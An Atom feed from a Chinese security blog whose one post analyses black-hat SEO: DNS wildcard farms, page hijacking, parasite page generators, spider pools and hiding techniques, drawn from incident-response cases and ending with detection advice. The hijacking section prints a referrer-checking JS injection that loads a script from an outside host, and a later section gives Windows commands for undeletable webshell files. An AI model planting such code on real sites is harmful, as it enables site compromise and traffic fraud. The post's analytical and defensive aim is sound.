<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>nMask&#39;s Blog</title>
  <subtitle>那一年，风陵渡口.......</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://thief.one/"/>
  <updated>2017-09-28T04:08:07.000Z</updated>
  <id>http://thief.one/</id>
  
  <author>
    <name>nMask</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>黑帽SEO手法剖析</title>
    <link href="http://thief.one/2017/09/28/1/"/>
    <id>http://thief.one/2017/09/28/1/</id>
    <published>2017-09-28T02:09:41.000Z</published>
    <updated>2017-09-28T04:08:07.000Z</updated>
    
    <content type="html"><![CDATA[<p><blockquote class="blockquote-center">视而不见，谓合道於希夷；挹之则盈，方同功於造化</blockquote><br>　　申明：本文写于一年前，由于当初项目原因一直没公开发布，最近对其内容稍做了修改并决定分享出来。</p>
<p>　　首先得说黑帽SEO是个老话题，我不难想想评论区必定有人吐槽此手法已经由来已久，作者有炒冷饭的嫌疑。我对此观点表示认可，然而细细回味之后，却又感到无奈不解。一个早已被用烂的黑产手法，一个每年给互联网产业造成巨大损失的黑色手段，为何能一直延续至今？是技术上难以攻破，还是利益驱使下选择视而不见？<br>　　当我发现公开资源中对此黑产手法的介绍寥寥无几且并不详细时，原因便可想而知了。为了营造了一个良好的互联网环境，我在此结合实际案列对黑帽SEO这种黑产手段进行剖析介绍，希望能够使安全界同道引起共鸣，共同抵制。由于距本文撰写已过去一年之久，而此期间我已不在研究相关技术，因此若文章内容有任何偏差及谬误请谅解。</p>
<p>插曲：有趣的是，就在前几天有位朋友询问了我关于黑帽SEO方面的问题，原因是他一位朋友运营的一个网站，页面莫名其妙出现了赌博博彩的内容，删除后又会自动生成，其十分苦难便寻求他帮忙。<br><a id="more"></a></p>
<h3 id="黑帽seo概念"><a href="#黑帽seo概念" class="headerlink" title="黑帽seo概念"></a>黑帽seo概念</h3><p>　　SEO全称为搜索引擎优化，是指通过站内优化、站外优化等方式，提升搜索引擎收录排名。既然有SEO技术，便会有相应的从业人员，他们被称为白帽SEO，专指通过公正SEO手法，帮助提升站点排名的专业人员。<br>　　当然有白便会有黑，由于白帽SEO优化的过程将会十分漫长，一个新站想要获取好的排名，往往需要花上几年时间做优化推广。因此一些想要快速提升自身网站排名的小伙伴，便开始在SEO上研究作弊手法，从而诞生了黑帽SEO。黑帽SEO是指通过作弊手段，让站点快速提升排名的一类SEO技术，或者说是黑客技术，比如说：黑链（暗链）、站群、网站劫持（搜索引擎劫持）、桥页等，黑帽SEO能够快速提升排名，但毕竟是违规作弊行为，容易被K。</p>
<h3 id="SEO的一些黑色手法"><a href="#SEO的一些黑色手法" class="headerlink" title="SEO的一些黑色手法"></a>SEO的一些黑色手法</h3><p>　　黑帽SEO的手法很多，并且在不断地更新换代，其中最常见的包括利用泛解析做站群，入侵高权重网站挂暗链，入侵高权重网站做网页劫持，篡改高权重网站网页内容，利用高权重网站二级目录做推广页面，修改nginx配置做目录反向代理等等。接下来我结合实际案例，介绍一些常用的手段。</p>
<h4 id="利用泛解析建立泛二级域名站群"><a href="#利用泛解析建立泛二级域名站群" class="headerlink" title="利用泛解析建立泛二级域名站群"></a>利用泛解析建立泛二级域名站群</h4><p>　　利用DNS泛解析可以快速建立站群，因为一个一级域名便可以衍生出无数个二级域名，当然一般需要借助站群工具，因为建立站群需要有很多内容不同的页面，手工建立显然不可能。而seo人员大费周章地建立站群的目的，便是能够快速吸引大量的搜索引擎爬虫，增加网站在搜索引擎中的收录量。以下是某个泛二级域名站群案例截图：<br><img src="/upload_image/20170515/10.png" alt=""><br>　　需要说明的是，以上截图中的二级域名并不是通过一条条dns解析记录去绑定的，解析里面设置的是*，也就是泛解析。而服务器端有程序或者代码去控制当构造不同的二级域名访问时，会返回不同的网页内容，也就让搜索引擎误认为每个二级域名都是一个单独的网站。<br>　　泛解析有很多优点，比如对用户友好（即使输错二级域名也能跳转到目标网站），又能够更快速地被搜索引擎收录等。基于这些优点，很多站长会选择用此方式来增加网站收录，然而如果没有妥善的使用泛解析可能会带来难以想象的危害。</p>
<h4 id="利用泛解析做黑产"><a href="#利用泛解析做黑产" class="headerlink" title="利用泛解析做黑产"></a>利用泛解析做黑产</h4><p>利用泛解析做黑帽seo的方式也有很多种，基于是否需要入侵网站以及dns服务器，我分为入侵法与非入侵法来介绍。</p>
<h5 id="入侵法"><a href="#入侵法" class="headerlink" title="入侵法"></a>入侵法</h5><p>真实案例：几个月前我们发现一个重要政府网站出现了大量博彩页面，取证截图如下：<br><img src="/upload_image/20170515/8.png" alt=""><br>　　经过分析我发现，此手法利用的便是泛解析，从截图中可以看到出现了大量此政府网站的二级甚至三级域名，而这些域名都是随机构造的，访问后会跳转到博彩色情等非法页面，而访问一级域名又是正常的内容。且先不分析跳转的过程中用到了哪些技术，单从泛解析记录就不难看出，此网站被人篡改了dns解析记录。我们有理由相信，黑客获取了此域名的dns解析控制权限，并将此域名泛解析到黑客准备好的服务器上。那么黑客这么做的目的很明显，为了让搜索引擎快速收录二级或者三级域名，从而达到引流到非法页面的目的。<br>　　我们通过分析此政府网站被入侵特征推导出此事件过程应该是，黑客通过入侵手段获取到了该政府网站dns解析权限（如何获取暂不可知），然后通过添加泛解析记录，将此记录指向黑客准备好的服务器，而此服务器上有动态语言去实现通过不同二级域名访问，返回不同的页面结果功能。由于政府网站本身权重很高，因此二级域名页面被百度快速收录，达到为非法页面引流的目的。这种手法的好处在于不必入侵网站，而只要获取到域名解析权限即可（当然获取域名解析权限也并非易事）。</p>
<h5 id="非入侵法"><a href="#非入侵法" class="headerlink" title="非入侵法"></a>非入侵法</h5><p>真实案例：几天前我们发现有一个网站（sdddzg.cn）利用泛解析做恶意推广，查看网站特征后，我们尝试构造不同的二级域名访问，取证截图如下。<br>构造二级域名访问：<br><img src="/upload_image/20170515/21.png" alt=""><br>最终返回结果：<br><img src="/upload_image/20170515/22.png" alt=""><br>　　可以看到返回结果对网页内容以及url做了处理，当我们尝试构造不同的二级域名访问，发现返回结果内容都不一样，然而通过获取ip发现来自同一台服务器。首先我们不难想到，此域名一定是做了泛解析的，那么它是如何控制网页内容变化的呢？<br>查看网页源码可以看到jiang.gov.cn网页源码被嵌入到了目标网页中。<br><img src="/upload_image/20170515/24.png" alt=""><br>　　那么其实想要实现此技术也并不难，可以在服务端上用代码实现。首先通过获取请求的二级域名地址，然后去访问该二级域名内容获取源码镶嵌到自己的网页内。如果构造的二级域名内容不是一个完整的域名地址（如：1.sdddzg.cn），则随机返回一段源码。这种手法的好处在于不必入侵网站，只需要自己搭建一台服务器即可，但推广效果没有那么好。</p>
<h4 id="利用网站暗链"><a href="#利用网站暗链" class="headerlink" title="利用网站暗链"></a>利用网站暗链</h4><p>　　在网页中植入暗链这种手法已经相对落伍了，目前用的也比较少，因为搜索引擎已经能够对此作弊手法进行检测。为了介绍知识的完整性，此处我简单介绍一下。暗链也称为黑链，即隐蔽链接 hidden links，是黑帽SEO的作弊手法之一。挂暗链的目的很简单，增加网站外链，提高网站排名；实现方式主要分为几种：利用CSS实现、利用JS实现、利用DIV+JS实现等。<br>具体介绍请参考：<a href="http://thief.one/2016/10/12/%E9%BB%91%E5%B8%BDSEO%E4%B9%8B%E6%9A%97%E9%93%BE/">黑帽SEO之暗链</a></p>
<h4 id="利用高权重网站，构造关键词URL做推广"><a href="#利用高权重网站，构造关键词URL做推广" class="headerlink" title="利用高权重网站，构造关键词URL做推广"></a>利用高权重网站，构造关键词URL做推广</h4><p>真实案例：一年前当我刚研究黑帽SEO的时候发现了一个有趣的黑帽SEO方式，虽然手法比较拙劣老套，但却也有成效。于是在写这篇文章的时候，我特意找了一个典型案例，与大家分享，取证截图如下。<br><img src="/upload_image/20170515/1.png" alt=""><br>　　将URL中的参数内容显示到网页内，这原本是某些网页的一种特殊功能。以往的经验告诉我这种特性如果没有处理好，可能会引发XSS漏洞，而今我不得不认识到，这种特性也一直被用于黑帽seo。通过在url或者post数据包（常见于搜索框功能）中构造推广关键词，再将有推广关键词页面添加到蜘蛛池中，使搜索引擎收录就能达到推广的目的。一般此种手法常被用来推广qq号，盈利网站等（类似打广告），而当我们通过搜索引擎搜索某些关键词时（如色情资源），就会显示出此页面，从而达到推广自身账号或者网站的目的，当然这只是一种推广手段，并不太涉及引流。</p>
<h4 id="利用网页劫持引流"><a href="#利用网页劫持引流" class="headerlink" title="利用网页劫持引流"></a>利用网页劫持引流</h4><p>　　网页劫持，又叫网站劫持或者搜索引擎劫持，是目前黑帽SEO中最流行的一种做法。其原因可以简单概括为：易收录、难发现，易收录表现为搜索引擎尚没有很好的机制能够检测出此作弊手段，网页劫持手法仍然能够大量引流。难发现是指网页劫持手法比较隐蔽，一般非技术人员很难发现它的存在。<br>　　网页劫持从手法上可以分为服务端劫持、客户端劫持、百度快照劫持、百度搜索劫持等等；<br>　　网页劫持的表现形式可以是劫持跳转，也可以是劫持呈现的网页内容（与直接篡改网页内容不同），目前被广泛应用于私服、博彩等暴利行业。</p>
<h5 id="网页劫持真实案例"><a href="#网页劫持真实案例" class="headerlink" title="网页劫持真实案例"></a>网页劫持真实案例</h5><p><img src="/upload_image/20170515/2.png" alt=""><br>　　几个月前我处理了一起网页劫持案列，起因是某政府网站上出现了博彩相关内容（排除新闻页面），这显然是不合规的。排除管理员失误添加导致，恐怕此网站多半是被黑客入侵了。首先我访问了该记录上的链接，紧接着浏览器中出现了一个正常的政府页面，而也就须臾之间，网页瞬间又跳转到了博彩网页。<br>图一为正常政府页面：<br><img src="/upload_image/20170515/3.png" alt=""><br>图二为博彩页面：<br><img src="/upload_image/20170515/4.png" alt=""><br>　　可以看到博彩页面的域名为www.0980828.com，显然不是先前的政府网站域名xxxx.gov.cn。看到此现象，再结合多年安全经验，我大致能够猜测此网站应该是被网页劫持了。通过分析以上过程的数据包，不难发现在该网站前端页面被嵌入了一段非法代码。<br><img src="/upload_image/20170515/5.png" alt=""><br>此代码存放在43.250.75.61服务器上，查看该服务器信息，发现其在日本。<br><img src="/upload_image/20170515/7.png" alt=""><br>而通过访问此段代码，返回内容则是跳转到www.0980828.com网站上。<br><img src="/upload_image/20170515/6.png" alt=""><br>　　分析至此，我们不难发现，导致页面跳转的原因便是xxxx.gov.cn网页被非法嵌入了一窜代码，而此代码能够控制访问该网页时跳转到博彩页面。这是搜索引擎劫持最为基础且常见的一种方式，其变种甚多，类型方式也各异。最后我通过登录web服务器查看，发现了存在大量html文件被篡改，且都在文件开头被写入外部js引用。那么此入侵事件过程应该是，黑客通过web应用程序某些漏洞入侵服务器（实际是管理后台弱口令+任意文件上传），通过批量篡改服务器静态文件实现网页劫持的目的。网页劫持的手法非常多，并不是这一个案例就能概括的，更多详细情况请继续看下文介绍。</p>
<h5 id="服务端劫持"><a href="#服务端劫持" class="headerlink" title="服务端劫持"></a>服务端劫持</h5><p>　　服务端劫持也称为全局劫持，此手法为修改网站动态语言文件，判断访问来源控制返回内容，从而达到网页劫持的目的。其特点往往是通过修改asp/aspx/php等后缀名文件，达到动态呈现网页内容的效果。<br>　　Global.asa、Global.asax、conn.asp、conn.php等文件比较特殊，作用是在每次执行一个动态脚本的时候，都会先加载该脚本，然后再执行目标脚本。所以只要在 Global.asa 中写判断用户系统信息的代码（访问来源等），如果是蜘蛛访问则返回关键词网页（想要推广的网站），如果是用户访问则返回正常页面。</p>
<h5 id="客户端劫持"><a href="#客户端劫持" class="headerlink" title="客户端劫持"></a>客户端劫持</h5><p>客户端劫持的手法也很多，但最常用的就两种：js劫持与Header劫持。</p>
<p>js劫持目的是通过向目标网页植入恶意js代码，控制网站跳转、隐藏页面内容、窗口劫持等。js植入手法是可以通过入侵服务器，直接写入源代码中；也可以写在数据库中，因为有些页面会呈现数据库内容。</p>
<p>js劫持代码案例：<br>以下代码可以使通过搜索引擎搜索的并点击页面时，执行一段js并跳转到博彩页面；而直接输入网址访问网页时，跳转到一个404页面。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">today=new Date();</div><div class="line">today=today.getYear()+<span class="string">"-"</span>+(today.getMonth()+1)+<span class="string">"-"</span>+today.getDate();</div><div class="line">var regexp=/\.(sogou|so|haosou|baidu|google|youdao|yahoo|bing|gougou|118114|vnet|360|ioage|sm|sp)(\.[a-z0-9\-]+)&#123;1,2&#125;\//ig;</div><div class="line">var <span class="built_in">where</span> =document.referer;</div><div class="line"><span class="keyword">if</span>(regexp.test(<span class="built_in">where</span>))&#123;</div><div class="line">document.write (<span class="string">'&lt;script language="javascript" type="text/javascript" src="http://www.xxx.com/test.js"&gt;&lt;/script&gt;'</span>);</div><div class="line">&#125;</div><div class="line"><span class="keyword">else</span></div><div class="line">&#123;</div><div class="line">window.location.href=<span class="string">"../../404.htm"</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
<p>　　代码分析：通过referer判断来路，如果referer来路为空就是跳转到404页面，如果是搜索引擎来的referer里面也会有显示，然后在写代码控制跳转。如果只是控制实现显示不同的内容，可以修改php、asp代码；如果需要劫持搜索引擎搜索框，可以写JS代码来做浏览器本地跳转。当然js功能可以无限扩展，比如可以控制一个ip一天内第一次访问正常，其余访问跳转等等。</p>
<p>header劫持，就是在html代码的head中添加特殊标签，代码如下：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&lt;meta http-equiv=<span class="string">"refresh"</span> content=<span class="string">"10; url=http://thief.one"</span>&gt;</div></pre></td></tr></table></figure></p>
<p>header劫持利用的就是Meta Refresh Tag（自动转向）功能将流量引走。</p>
<h4 id="直接篡改网页内容（比较低级）"><a href="#直接篡改网页内容（比较低级）" class="headerlink" title="直接篡改网页内容（比较低级）"></a>直接篡改网页内容（比较低级）</h4><p>　　有些黑客在入侵网站后，喜欢直接篡改网页内容，比如放上自己的qq号，或者作为推广将网页篡改成非法页面。在此我对此做法的黑客表示鄙视，因为这是一种最恶劣最低级的手法。恶劣在于直接篡改网页内容，可能会导致网站无法挽回的损失；低级在于此手法极易被发现，起不到真正的引流推广作用。</p>
<h4 id="利用高权重网站二级目录"><a href="#利用高权重网站二级目录" class="headerlink" title="利用高权重网站二级目录"></a>利用高权重网站二级目录</h4><p>　　即黑客入侵网站后，在网站二级目录下创建很多自己做推广的页面。为了达到引流的目的黑客往往需要建立大量的二级目录页面，因此需要用到寄生虫程序来自动化的创建页面。此手法也需要入侵高权重网站，获取网站服务器权限。与网页劫持手法不同的是，此手法侧重点在于利用高权重网站自身的优势，在其目录下创建多个推广页面；而网页劫持侧重隐藏自身，其可以做到动态呈现网页内容给客户。因此在实际使用中，黑客经常结合两者使用。此手法与利用泛解析做黑帽seo的手法还是有明显差异的，虽然同样是利用高权重网站本身的优势，但泛解析利用的是二级域名，而此手法利用的是二级目录，当然两者有异曲同工之妙。<br>　　利用高权重网站二级目录手法的案例与泛解析案例类似，这里不再详述。既然我前面提到此手法往往需要寄生虫程序的配合使用，那么我们来看看，何为寄生虫程序？它又有何玄机？</p>
<h3 id="寄生虫（jsc"><a href="#寄生虫（jsc" class="headerlink" title="寄生虫（jsc)"></a>寄生虫（jsc)</h3><p>　　寄生虫是黑帽SEO常用的一种方法，通过侵入别人网站，植入寄生虫程序，自动生成各种非法页面。之所以叫做寄生虫是因为能够自己触发生成，而不是一次生成，例如在访问网页的时候触发，自动生成页面且形成链轮等。简单来说，寄生虫是一种程序，此程序的功能是能够自己创建网页文件，而创建的条件可以定制，比如说当有人访问某个页面时就会触发寄生虫程序生成一批新的网页文件，或者每天定时创建等等。<br>　　我曾经在给一个客户处理应急响应事件时，便遇到过此类状况。每当我清理完所有恶意网页文件后，服务器上都会不时地自动生成一大批新的网页文件。令人头疼的是，当时我完全掌握不了生成新文件的规律。后来我们在一一排除web服务器上的文件时，发现了其中一个恶意的动态语言文件（由于种种原因，样本没有保留下来），此恶意文件就是类似寄生虫程序，会在我们访问此网站的某个页面触发，生成一批新的恶意页面。</p>
<h4 id="寄生虫分类"><a href="#寄生虫分类" class="headerlink" title="寄生虫分类"></a>寄生虫分类</h4><p>　　寄生虫分为动态与静态，动态寄生虫程序的就是会不断自动生成新的页面（如我上面所述案例），或者是刷新页面以后自动变化内容，动态寄生虫生成的恶意文件往往是asp/php后缀文件；而静态寄生虫程序生成的页面往往都是固定不变的内容，大多为html后缀文件。</p>
<h4 id="寄生虫模板"><a href="#寄生虫模板" class="headerlink" title="寄生虫模板"></a>寄生虫模板</h4><p>　　寄生虫程序生成的页面往往都是有固定模板的，模板的好坏有时也决定了是否能够被搜索引擎快速收录，以下是我收集的两种寄生虫程序生成的模板页面。<br>寄生虫模板案例一：<br><img src="/upload_image/20170515/18.png" alt=""><br>寄生虫模板案例二：<br><img src="/upload_image/20170515/19.png" alt=""></p>
<h4 id="静态寄生虫挂二级目录案例"><a href="#静态寄生虫挂二级目录案例" class="headerlink" title="静态寄生虫挂二级目录案例"></a>静态寄生虫挂二级目录案例</h4><p>案例来自去年处理的一起入侵检测事件，我们发现目标网站上被挂了非法推广页面，如下图所示：<br><img src="/upload_image/20170515/26.png" alt=""><br>通过登录web服务器查看，我们发现了网站根目录下多了一个二级目录ds，而ds目录内放满了html文件，都是通过寄生虫生成的。（由于时间久远，html样本文件已丢失）<br><img src="/upload_image/20170515/25.png" alt=""><br>通过登录服务器日志分析，我们最终发现黑客是通过web应用程序漏洞获取到了服务器权限，并在该服务器上利用静态寄生虫程序创建了大量恶意的html后缀文件，并存放在ds目录下，其利用的便是高权重网站二级目录手法。</p>
<p>　　以上占用大量篇幅介绍了很多黑帽seo的手法，也介绍了寄生虫程序这一自动生成网页文件的利器。那么黑帽seo是如何让这些非法页面快速被搜索引擎收录的呢？我们知道如果这些恶意推广的页面无法被搜索引擎收录，那么黑帽SEO就达不到预期的效果。起初在研究黑帽seo时我也一直在思考这个问题，按常理搜索引擎不应该会收录具有恶意内容的推广页面，而事实是目前我们随便在百度上搜<em>site:.gov.cn 博彩</em>或者<em>site:.edu.cn 色情</em>，就会出现一大批被挂上博彩色情的政府教育机构网站。显然这些页面目前还是能够很好地被搜索引擎收录，甚至能很快被收录，我曾经发现过几分钟内被收录的恶意页面。那么是搜索引擎故意为之，还是有人利用了搜索引擎的某些特征或者说漏洞？要理解这个问题，我想必须得介绍一下黑帽SEO又一大利器—蜘蛛池。</p>
<h3 id="蜘蛛池"><a href="#蜘蛛池" class="headerlink" title="蜘蛛池"></a>蜘蛛池</h3><p>　　蜘蛛池是一种通过利用大型平台权重来获得搜索引擎收录以及排名的一种程序。原理可以理解为事先创建了一些站群，获取（豢养）了大量搜索引擎蜘蛛。当想要推广一个新的站点时，只需要将该站点以外链的形式添加到站群中，就能吸引蜘蛛爬取收录。简单来说就是通过购买大量域名，租用大量服务器，批量搭建网站形成站群。而这些网站彼此之间形成链轮，网站内容大多为超链接，或者一些动态的新闻内容等。经过一段时间的运营，此站群每天就能吸引一定量的搜索引擎蜘蛛，蜘蛛的多少要看网站内容搭建的好坏以及域名的个数。当蜘蛛数量达到一个量级且稳定以后，就可以往里面添加想要推广的网页，比如通过黑帽SEO手段创建的非法页面。这一过程就好比在一个高权重网站上添加友情链接，会达到快速收录的目的。</p>
<h4 id="蜘蛛池交易平台"><a href="#蜘蛛池交易平台" class="headerlink" title="蜘蛛池交易平台"></a>蜘蛛池交易平台</h4><p>　　我随便百度了一下，发现互联网上存在很多蜘蛛池交易平台，即可通过互联网上的蜘蛛池推广恶意网页。这种方式省去了自己搭建蜘蛛池的麻烦，却也为黑帽seo人员提供了便利。在收集资料时，我挑选了其中一个交易平台，截图如下：<br><img src="/upload_image/20170515/11.png" alt=""></p>
<h4 id="蜘蛛池站点案例"><a href="#蜘蛛池站点案例" class="headerlink" title="蜘蛛池站点案例"></a>蜘蛛池站点案例</h4><p>在为本篇文章收集黑帽SEO相关资料时，我发现了一款经典的蜘蛛池站点，在此分享。<br><img src="/upload_image/20170515/12.png" alt=""><br>其特点是内容动态生成，刷新页面发现内容随机改变<br><img src="/upload_image/20170515/13.png" alt=""><br>很明显此网站内容都是通过动态寄生虫程序生成的，且不断变化内容来增加百度对其收录。（百度目前对原创内容的收录率比较高）</p>
<h4 id="几大搜索引擎收录情况"><a href="#几大搜索引擎收录情况" class="headerlink" title="几大搜索引擎收录情况"></a>几大搜索引擎收录情况</h4><p>百度搜索引擎收录情况：<br><img src="/upload_image/20170515/14.png" alt=""><br>谷歌搜索引擎收录情况：<br><img src="/upload_image/20170515/15.png" alt=""><br>bing搜索引擎收录情况：<br><img src="/upload_image/20170515/16.png" alt=""><br>搜狗搜索引擎收录情况：<br><img src="/upload_image/20170515/17.png" alt=""><br>通过对比几大常用搜索引擎对此蜘蛛池站点的收录情况，我们不难看出这套蜘蛛池程序目前只对百度搜索引擎爬虫有效。当然78条的收录量对于一个蜘蛛池站点来说不算很高，说明百度对此手段已有所防范。</p>
<h3 id="隐身的技术"><a href="#隐身的技术" class="headerlink" title="隐身的技术"></a>隐身的技术</h3><p>　　在处理的一些入侵应急响应事件中，我们发现有些网站被挂恶意页面达数月甚至数年之久，而在此期间管理员竟然毫无察觉。有时这并非是管理员的粗心大意，而是黑客过于狡猾。在了解了我之前所介绍的网页劫持手段后，我想你大概能了解这其中的缘由了，网页劫持能控制跳转控制页面呈现的内容，这便是难以被管理员发现的主要原因。除此之外，寄生虫程序能够自动生成网页也使得其生存能力很强，不易被根除。其次我们在发现网站被挂恶意网页后，通常会登录服务器进行查看，而有时我们很难找到被非法篡改或者被恶意植入的脚本文件，因为此类型文件被黑客精心地隐藏了起来。那么除了上述手段之外，黑客还有哪些手段来隐藏自身，使之生生不灭？</p>
<h4 id="nginx二级目录反向代理技术"><a href="#nginx二级目录反向代理技术" class="headerlink" title="nginx二级目录反向代理技术"></a>nginx二级目录反向代理技术</h4><p>　　通过配置nginx/apache等中间件配置文件设置目录代理，将服务器上某个目录代理到自己搭建服务器上的某个目录。即浏览者在打开thief.one/2016/目录时，实际访问到的资源是自己服务器上的某个目录（目标服务器会去自己服务器上拿数据）。这种手法不需要修改目标服务器网站源码，只需要修改中间件配置文件，不易被删除也不易被发现。</p>
<h4 id="隐藏文件"><a href="#隐藏文件" class="headerlink" title="隐藏文件"></a>隐藏文件</h4><p>　　给文件设置属性隐藏。我曾经遇到过此类事件，当时我们一个技术人员通过肉眼选择了服务器上一批web目录下的文件进行copy。而当我们对这些文件进行扫描时，并未发现任何异常，一切都变得匪夷所思。而最后的结果让我们哭笑不得，原来恶意文件被设置成了属性隐藏，通过肉眼观察的技术人员并没有将此文件copy下来，因此这也算是一种有效的障眼法。</p>
<h4 id="不死文件"><a href="#不死文件" class="headerlink" title="不死文件"></a>不死文件</h4><p>不死文件指的是删除不了的webshell或者是非法页面文件（.html或者动态文件），此类事件在实际中没有遇到过，但理论上确实可行。</p>
<h5 id="设置畸形目录"><a href="#设置畸形目录" class="headerlink" title="设置畸形目录"></a>设置畸形目录</h5><p>目录名中存在一个或多个. (点、英文句号)<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">md a..\</div></pre></td></tr></table></figure></p>
<p>该目录无法被手工删除，当然命令行可以删除<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rd /s /q a..\</div></pre></td></tr></table></figure></p>
<h5 id="特殊文件名"><a href="#特殊文件名" class="headerlink" title="特殊文件名"></a>特殊文件名</h5><p>其实是系统设备名，这是Windows 系统保留的文件名，普通方法无法访问，主要有：lpt,aux,com1-9,prn,nul,con，例如：lpt.txt、com1.txt 、aux.txt，aux.pasp，aux.php等。<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">echo</span> hello&gt;\\.\c:\a..\aux.txt</div></pre></td></tr></table></figure></p>
<h5 id="畸形目录-特殊文件名"><a href="#畸形目录-特殊文件名" class="headerlink" title="畸形目录+特殊文件名"></a>畸形目录+特殊文件名</h5><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">md c:\a..\</div><div class="line"><span class="built_in">echo</span> hello&gt;\\.\c:\a..\aux.asp    <span class="comment">#注意：这里的路径要写绝对路径（上传的aux.php木马可以被执行）</span></div></pre></td></tr></table></figure>
<p>删除：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">rd /s /q \\.\c:\a..\</div></pre></td></tr></table></figure></p>
<p>方法还有很多，不一一列举了。</p>
<h3 id="如何检测自身网站是否被劫持？"><a href="#如何检测自身网站是否被劫持？" class="headerlink" title="如何检测自身网站是否被劫持？"></a>如何检测自身网站是否被劫持？</h3><p>　　前面介绍了很多关于黑帽seo的手法，那作为站长或者运维该怎么去监控自身网站是否被入侵，且被黑帽seo利用了呢？这里不说如何检测入侵，因为这不是本文的范畴，我们只谈如何检测被黑帽seo利用，这里提供几个思路：<br>　　第一种内部监控：可以监控服务器web目录下的文件改动情况，一般黑帽seo都需要改动web目录下的文件（新增文件，或更改文件内容）。当然有些只改变nginx配置就可以达到目的，因此nginx等服务器的配置文件也需要进行监控。<br>　　第二种外部检测：黑帽seo手法从根本上是欺骗搜索引擎，因此检测本质上也可以从搜索引擎出发。检测网站在搜索引擎搜索显示下是否出现了敏感的内容，比如：博彩、色情等。当然由于网页劫持手法可以动态调控显示内容，比如不同地区点击返回不同的内容等，因此这需要我们的检测程序能够多维度得进行检测。</p>
<h3 id="谁来为此买单？"><a href="#谁来为此买单？" class="headerlink" title="谁来为此买单？"></a>谁来为此买单？</h3><p>　　基于黑帽SEO大多数都为博彩赌博行业做推广，将会增加网民沉迷网络赌博的风险，纵观身边因为网络赌博而家破人亡的事情不在少数；而也有一部分黑帽SEO在为枪支弹药、毒品违禁药物做推广，更是为犯罪分子提供了便利。在此之前，我一直认为黑产只是暴利并无太大危害，然而通过对黑帽SEO的研究发现，其危害的绝不仅仅只是经济而已。那么这一切，应该由谁来买单？<br>　　首先网站管理者难辞其咎，正因为管理员安全意识的淡薄，网站安全性不高，导致被入侵最终成为黑产的一部分。在我自身处理的几起类似事件中，网站管理员往往是一副无关紧要的态度，即使网站已经被黑帽SEO利用，也觉得没有对网站本身造成什么危害，觉悟性不高。<br>　　其次搜索引擎应该担负一定的责任，因为黑帽SEO行为主要针对搜索引擎，说白了就是利用搜索引擎算法漏洞，提升非法网站权重。国内大多数网民上网都使用搜索引擎。搜索引擎既然有权利决定显示哪些资源给用户，那么也必须有义务确保这些资源的安全性、正规性。</p>
<h3 id="如何制止与防御？"><a href="#如何制止与防御？" class="headerlink" title="如何制止与防御？"></a>如何制止与防御？</h3><p>如果您是网民，制止黑帽seo最好的方式就是科学上网，发现非法网站及时提交到<a href="https://www.anquan.org/" target="_blank" rel="external">安全联盟</a>或向搜索引擎举报。<br>如果您是网站管理员，请做好自身网站的安全建设，及时补漏；若已发现被入侵，及时联系技术人员处理。</p>
<h3 id="谈谈心"><a href="#谈谈心" class="headerlink" title="谈谈心"></a>谈谈心</h3><p>　　当在写这篇文章前，我思索着尽量能够全面地介绍黑帽SEO知识以及手法。当开始写这篇文章的时候，我便有点无从下手，因为涉及知识面太广，手法又非常丰富，我研究黑帽SEO不久了解也不算深入。而当我写完这篇文章的时候，我觉得这一切才刚刚开始，也许我此刻抒写的正是黑客几年前或十几年前所用或者所流行的技术。</p>
<h3 id="传送门"><a href="#传送门" class="headerlink" title="传送门"></a>传送门</h3><p>更多黑帽SEO基础知识，请参考以下链接。</p>
<blockquote>
<p><a href="http://thief.one/2016/10/09/%E9%BB%91%E5%B8%BDSEO%E4%B9%8B%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86/">【黑帽SEO系列】基础知识</a><br><a href="http://thief.one/2016/10/12/%E9%BB%91%E5%B8%BDSEO%E4%B9%8B%E6%9A%97%E9%93%BE/">【黑帽SEO系列】暗链</a><br><a href="http://thief.one/2016/10/12/%E9%BB%91%E5%B8%BDSEO%E4%B9%8B%E7%BD%91%E9%A1%B5%E5%8A%AB%E6%8C%81/">【黑帽SEO系列】网页劫持</a><br><a href="http://thief.one/2016/10/10/%E9%BB%91%E5%B8%BDSEO%E4%B9%8B%E9%A1%B5%E9%9D%A2%E8%B7%B3%E8%BD%AC/">【黑帽SEO系列】页面跳转</a></p>
</blockquote>
<p><hr></p>
<blockquote>
<p>转载请说明出处：<a href="http://thief.one/2017/05/15/1">黑帽SEO手法剖析|nMask’Blog</a><br>本文地址：<a href="http://thief.one/2017/05/15/1">http://thief.one/2017/05/15/1</a></p>
</blockquote>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;blockquote class=&quot;blockquote-center&quot;&gt;视而不见，谓合道於希夷；挹之则盈，方同功於造化&lt;/blockquote&gt;&lt;br&gt;　　申明：本文写于一年前，由于当初项目原因一直没公开发布，最近对其内容稍做了修改并决定分享出来。&lt;/p&gt;
